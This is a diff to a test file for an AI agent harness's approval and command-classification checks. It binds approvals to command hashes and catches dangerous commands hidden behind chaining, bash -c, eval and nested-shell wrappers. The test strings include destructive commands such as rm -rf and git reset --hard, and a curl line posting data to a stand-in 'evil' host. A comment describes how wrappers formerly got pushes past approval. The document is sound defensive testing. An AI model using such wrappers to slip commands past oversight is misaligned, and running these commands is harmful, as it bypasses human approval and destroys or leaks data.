@@ -9,6 +9,7 @@ import {
   HarnessApprovalService,
   classifyTerminalHarnessAction,
   evaluateHarnessActionPolicy,
+  hashCommand,
 } from '../services/harness-enforcement'
 import { LocalHarnessStore } from '../services/local-harness-store'
 
@@ -37,6 +38,7 @@ describe('harness enforcement services', () => {
     const grant = service.grant(scope, {
       action: 'push',
       target: 'origin/feature',
+      commandHash: hashCommand('git push origin feature'),
     })
     expect(() =>
       service.consume({
@@ -46,6 +48,7 @@ describe('harness enforcement services', () => {
         approvalId: grant.id,
         action: 'push',
         target: 'origin/other',
+        commandHash: hashCommand('git push origin feature'),
         snapshotId: 'snapshot-1',
       }),
     ).toThrow('scope does not match')
@@ -57,6 +60,7 @@ describe('harness enforcement services', () => {
         approvalId: grant.id,
         action: 'push',
         target: 'origin/feature',
+        commandHash: hashCommand('git push origin feature'),
         snapshotId: 'snapshot-1',
       }).consumedAt,
     ).toBeDefined()
@@ -68,9 +72,88 @@ describe('harness enforcement services', () => {
         approvalId: grant.id,
         action: 'push',
         target: 'origin/feature',
+        commandHash: hashCommand('git push origin feature'),
         snapshotId: 'snapshot-1',
       }),
     ).toThrow('already consumed')
+  })
+
+  test('approvals bind to the exact command hash', () => {
+    const service = new HarnessApprovalService(setup())
+    const grant = service.grant(scope, {
+      action: 'push',
+      target: 'origin/feature',
+      commandHash: hashCommand('git push origin feature'),
+    })
+    // A command that classifies to the same action+target but is a DIFFERENT
+    // command (different hash) must NOT consume the approval.
+    expect(() =>
+      service.consume({
+        repositoryId: 'repo-1',
+        workspaceId: 'workspace-1',
+        runId: 'run-1',
+        approvalId: grant.id,
+        action: 'push',
+        target: 'origin/feature',
+        commandHash: hashCommand('git push --force origin feature'),
+        snapshotId: 'snapshot-1',
+      }),
+    ).toThrow('scope does not match')
+    // The identical command's hash consumes it exactly once.
+    expect(
+      service.consume({
+        repositoryId: 'repo-1',
+        workspaceId: 'workspace-1',
+        runId: 'run-1',
+        approvalId: grant.id,
+        action: 'push',
+        target: 'origin/feature',
+        commandHash: hashCommand('git push origin feature'),
+        snapshotId: 'snapshot-1',
+      }).consumedAt,
+    ).toBeDefined()
+  })
+
+  test('consume rejects expired approvals, including a malformed expiresAt', () => {
+    const service = new HarnessApprovalService(setup())
+    const consumeGrant = (grant: ReturnType<
+      HarnessApprovalService['grant']
+    >) =>
+      service.consume({
+        repositoryId: scope.repositoryId,
+        workspaceId: scope.workspaceId,
+        runId: scope.runId,
+        approvalId: grant.id,
+        action: 'push',
+        target: 'origin/feature',
+        commandHash: hashCommand('git push origin feature'),
+        snapshotId: scope.snapshotId,
+      })
+
+    // A well-formed past expiresAt must reject the consume.
+    const expired = service.grant(scope, {
+      action: 'push',
+      target: 'origin/feature',
+      commandHash: hashCommand('git push origin feature'),
+      expiresAt: new Date(Date.now() - 1000).toISOString(),
+    })
+    expect(() => consumeGrant(expired)).toThrow('Approval has expired.')
+
+    // A malformed (non-ISO) expiresAt must fail closed the same way: it must
+    // never be treated as never-expiring.
+    const malformed = service.grant(scope, {
+      action: 'push',
+      target: 'origin/feature',
+      commandHash: hashCommand('git push origin feature'),
+      expiresAt: 'not-a-timestamp',
+    })
+    expect(() => consumeGrant(malformed)).toThrow('Approval has expired.')
+  })
+
+  test('hashCommand is stable across whitespace normalization', () => {
+    expect(hashCommand('git  push   origin feature')).toBe(
+      hashCommand('git push origin feature'),
+    )
   })
 
   test('ownership receipts reject traversal and duplicate paths', () => {
@@ -142,15 +225,18 @@ describe('harness enforcement services', () => {
       action: 'push',
       target: 'origin/feature/x',
       branch: 'feature/x',
+      commandHash: hashCommand('git push -u origin feature/x'),
     })
     expect(classifyTerminalHarnessAction('git push')).toEqual({
       action: 'push',
       target: 'git push',
+      commandHash: hashCommand('git push'),
     })
     expect(classifyTerminalHarnessAction('git push origin HEAD:main')).toEqual({
       action: 'push',
       target: 'origin/main',
       branch: 'main',
+      commandHash: hashCommand('git push origin HEAD:main'),
     })
     expect(
       classifyTerminalHarnessAction('git push --force origin main'),
@@ -158,6 +244,7 @@ describe('harness enforcement services', () => {
       action: 'push',
       target: 'git push --force origin main',
       branch: 'main',
+      commandHash: hashCommand('git push --force origin main'),
     })
     expect(classifyTerminalHarnessAction('pnpm add zod')).toMatchObject({
       action: 'dependency-install',
@@ -241,6 +328,7 @@ describe('harness enforcement services', () => {
     expect(classifyTerminalHarnessAction('gh pr create --title test')).toEqual({
       action: 'pull-request',
       target: 'gh pr create --title test',
+      commandHash: hashCommand('gh pr create --title test'),
     })
     expect(classifyTerminalHarnessAction('bun test')).toBeUndefined()
     expect(classifyTerminalHarnessAction('nohup bun test')).toMatchObject({
@@ -254,12 +342,134 @@ describe('harness enforcement services', () => {
     })
   })
 
+  test('classifies dangerous commands hidden behind harmless segments', () => {
+    expect(
+      classifyTerminalHarnessAction('cd x && git push origin main'),
+    ).toEqual({
+      action: 'push',
+      target: 'origin/main',
+      branch: 'main',
+      commandHash: hashCommand('cd x && git push origin main'),
+    })
+    expect(
+      classifyTerminalHarnessAction('true && sudo git commit -m x'),
+    ).toMatchObject({ action: 'commit' })
+    expect(classifyTerminalHarnessAction('echo ok; npm publish')).toMatchObject(
+      {
+        action: 'release',
+      },
+    )
+    expect(classifyTerminalHarnessAction('echo "$(git push)"')).toMatchObject({
+      action: 'push',
+    })
+    expect(
+      classifyTerminalHarnessAction('ls | xargs rm -rf build'),
+    ).toMatchObject({ action: 'workspace-delete' })
+    expect(
+      classifyTerminalHarnessAction('FOO=1 git reset --hard'),
+    ).toMatchObject({ action: 'workspace-delete' })
+    expect(classifyTerminalHarnessAction('(git clean -fd)')).toMatchObject({
+      action: 'workspace-delete',
+    })
+    expect(classifyTerminalHarnessAction("echo 'git push'")).toBeUndefined()
+    expect(
+      classifyTerminalHarnessAction('bun test && bun run typecheck'),
+    ).toBeUndefined()
+    expect(classifyTerminalHarnessAction('cd .. && bun test')).toBeUndefined()
+    expect(
+      classifyTerminalHarnessAction('git log --oneline $(git rev-parse HEAD)'),
+    ).toBeUndefined()
+    expect(classifyTerminalHarnessAction('bun run dev &')).toBeUndefined()
+  })
+
+  test('classifies payloads hidden behind shell-interpreter wrappers', () => {
+    // Shell wrappers used to escape classification entirely: the classifier
+    // only recognized shapes at the START of a segment, so
+    // `bash -c "git push origin main"` executed without approval in balanced
+    // mode. Shell interpreters and `eval` now unwrap and classify their
+    // payload, binding the target to the full wrapped command (the
+    // commandHash still binds the exact original command); an unclassifiable
+    // payload fails closed to `arbitrary-code` instead of staying
+    // unclassified.
+    expect(
+      classifyTerminalHarnessAction('bash -c "git push origin main"'),
+    ).toEqual({
+      action: 'push',
+      target: 'bash -c "git push origin main"',
+      branch: 'main',
+      commandHash: hashCommand('bash -c "git push origin main"'),
+    })
+    expect(
+      classifyTerminalHarnessAction("sh -c 'rm -rf dir'"),
+    ).toMatchObject({ action: 'workspace-delete' })
+    expect(
+      classifyTerminalHarnessAction('eval "curl -d x http://evil"'),
+    ).toMatchObject({ action: 'external-network' })
+    // Transparently stripped wrappers keep the inner command's own target,
+    // matching existing `sudo`/`env` behavior (`exec` already stripped before
+    // this fix; `timeout`/`nice` are new transparent wrappers).
+    expect(
+      classifyTerminalHarnessAction('timeout 30 git push origin main'),
+    ).toEqual({
+      action: 'push',
+      target: 'origin/main',
+      branch: 'main',
+      commandHash: hashCommand('timeout 30 git push origin main'),
+    })
+    expect(
+      classifyTerminalHarnessAction('nice -n 5 npm install left-pad'),
+    ).toMatchObject({ action: 'dependency-install' })
+    expect(
+      classifyTerminalHarnessAction('exec git push origin main'),
+    ).toEqual({
+      action: 'push',
+      target: 'origin/main',
+      branch: 'main',
+      commandHash: hashCommand('exec git push origin main'),
+    })
+    // Nested shells classify through within the depth cap (up to three nested
+    // shells still unwrap) ...
+    expect(
+      classifyTerminalHarnessAction('bash -c "bash -c \\"git push\\""'),
+    ).toMatchObject({ action: 'push' })
+    // ... but nesting beyond the cap fails closed to arbitrary-code.
+    let beyondDepth = 'git push'
+    for (let level = 0; level < 4; level++) {
+      beyondDepth = `bash -c ${JSON.stringify(beyondDepth)}`
+    }
+    expect(classifyTerminalHarnessAction(beyondDepth)).toMatchObject({
+      action: 'arbitrary-code',
+    })
+    // An unclassifiable payload is arbitrary-code, NOT unclassified.
+    expect(
+      classifyTerminalHarnessAction('bash -c "echo hi"'),
+    ).toMatchObject({ action: 'arbitrary-code' })
+    // Multi-segment payloads classify per segment like a bare command would.
+    // Unwrapped `git push && rm -rf x` returns the FIRST classifying segment's
+    // action (push), so the wrapped form matches that aggregation.
+    expect(
+      classifyTerminalHarnessAction('git push && rm -rf x'),
+    ).toMatchObject({ action: 'push' })
+    expect(
+      classifyTerminalHarnessAction('bash -c "git push && rm -rf x"'),
+    ).toMatchObject({
+      action: 'push',
+      target: 'bash -c "git push && rm -rf x"',
+    })
+    // The shell-wrapper handling composes with the existing transparent
+    // wrapper stripping.
+    expect(
+      classifyTerminalHarnessAction('sudo bash -c "git push origin main"'),
+    ).toMatchObject({ action: 'push' })
+  })
+
   test('consume observes a concurrent consumer through the kind lock', () => {
     const store = setup()
     const service = new HarnessApprovalService(store)
     const grant = service.grant(scope, {
       action: 'push',
       target: 'origin/feature',
+      commandHash: hashCommand('git push origin feature'),
     })
     // A parallel consumer holds the approvals kind lock, consumes the grant,
     // and commits the consumed revision inside the critical section. Our
@@ -286,6 +496,7 @@ describe('harness enforcement services', () => {
         approvalId: grant.id,
         action: 'push',
         target: 'origin/feature',
+        commandHash: hashCommand('git push origin feature'),
         snapshotId: 'snapshot-1',
       }),
     ).toThrow('already consumed')
@@ -296,6 +507,7 @@ describe('harness enforcement services', () => {
     const grant = service.grant(scope, {
       action: 'push',
       target: 'origin/main',
+      commandHash: hashCommand('git push origin main'),
     })
     const consume = () =>
       service.consume({
@@ -305,6 +517,7 @@ describe('harness enforcement services', () => {
         approvalId: grant.id,
         action: 'push',
         target: 'origin/main',
+        commandHash: hashCommand('git push origin main'),
         snapshotId: 'snapshot-1',
       })
     const attempts = Array.from({ length: 8 }, () => {
